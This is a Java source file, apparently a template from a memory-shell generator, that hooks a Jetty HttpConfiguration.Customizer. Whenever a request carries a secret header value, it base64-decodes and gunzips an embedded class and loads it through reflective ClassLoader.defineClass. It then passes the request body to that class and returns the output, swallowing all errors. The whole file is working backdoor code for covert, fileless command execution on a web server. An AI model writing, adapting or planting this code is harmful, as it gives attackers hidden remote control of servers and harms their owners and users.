package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Jetty HttpConfiguration.Customizer 的无 Jetty 编译依赖模板。
 *
 * <p>生成阶段会补入 Customizer 接口和 Jetty 精确签名的桥接方法，模板本身只保留
 * 反射实现，避免把某一 Jetty 版本打进生成器。</p>
 */
public class LeoJettyCustomizerTpl {

    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    public void customizeRequest(Object request) {
        try {
            String actualHeader = (String) request.getClass()
                    .getMethod("getHeader", String.class).invoke(request, headerName);
            if (actualHeader == null || !actualHeader.contains(headerValue)) {
                return;
            }

            Object response = invokeMethod(request, "getResponse", null, null);
            response.getClass().getMethod("setStatus", int.class)
                    .invoke(response, respCode);

            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            try {
                Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
            } catch (ClassNotFoundException e) {
                GZIPInputStream gzip = new GZIPInputStream(
                        new ByteArrayInputStream(base64Decode(coreClass)));
                while ((bytesRead = gzip.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
                Method defineClass = ClassLoader.class.getDeclaredMethod(
                        "defineClass", String.class, byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                defineClass.invoke(ClassLoader.getSystemClassLoader(), null,
                        output.toByteArray(), 0, output.size());
            } finally {
                InputStream input = (InputStream) request.getClass()
                        .getMethod("getInputStream").invoke(request);
                output.reset();
                while ((bytesRead = input.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
                try {
                    ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
                            .newInstance()).invoke(null, null, new Object[]{output});
                } catch (Throwable e) {
                    throw new IllegalStateException("Core invocation failed", e);
                }
                Object responseOutput = response.getClass().getMethod("getOutputStream")
                        .invoke(response);
                responseOutput.getClass().getMethod("write", byte[].class)
                        .invoke(responseOutput, new Object[]{output.toByteArray()});
            }
            invokeMethod(request, "setHandled", new Class[]{boolean.class},
                    new Object[]{Boolean.TRUE});
        } catch (Throwable ignored) {
        }
    }

    public static Object invokeMethod(Object object, String name,
                                      Class<?>[] parameterTypes, Object[] arguments) throws Exception {
        Class<?> type = object.getClass();
        Method method = null;
        while (type != null && method == null) {
            try {
                method = type.getDeclaredMethod(name,
                        parameterTypes == null ? new Class[0] : parameterTypes);
            } catch (NoSuchMethodException ignored) {
                type = type.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(name);
        }
        method.setAccessible(true);
        return method.invoke(object, arguments == null ? new Object[0] : arguments);
    }

    public byte[] base64Decode(String value) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class)
                    .invoke(clazz.newInstance(), value);
        } catch (Exception ignored) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        }
    }
}
